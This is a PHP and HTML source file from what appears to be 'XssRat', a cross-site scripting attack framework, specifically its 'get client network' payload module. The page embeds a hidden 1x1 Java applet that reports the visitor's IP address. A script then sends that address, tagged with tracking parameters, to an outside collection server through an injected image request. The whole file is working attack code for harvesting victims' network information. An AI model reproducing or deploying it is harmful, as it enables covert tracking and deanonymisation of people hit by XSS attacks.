<?php
/* 
 * 
 * @project XssRat
 * @author owlinrye
 * @email blackrat.sec@gmail.com
 * An easy Xss framework
 * 
 * get client network
 * 
 */
 
   	
 	$ticket = htmlspecialchars($_REQUEST["t"]);
 	$pmd_id = htmlspecialchars($_REQUEST["i"]);
	$a_id = htmlspecialchars($_REQUEST["a"]);
 	$ec = htmlspecialchars($_REQUEST["ec"]);
 			 
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head></head>
	
	<body>
				
	<script>
	  
     function MyAddress(IP) { 
        var d = document.createElement('img');
		d.src = "http://xssrat.sinaapp.com/api/res.php?t=<?php echo $ticket; ?>&i=<?php echo $pmd_id; ?>&a=<?php echo $a_id; ?>&ec=<?php echo $ec; ?>&c=IP:"+IP;
		document.getElementsByTagName('body')[0].appendChild(d); 
     } 
      
    </script>	
		
		<APPLET CODE='MyAddress.class' MAYSCRIPT WIDTH=1 HEIGHT=1></APPLET>
	</body>	
	
	
</html>
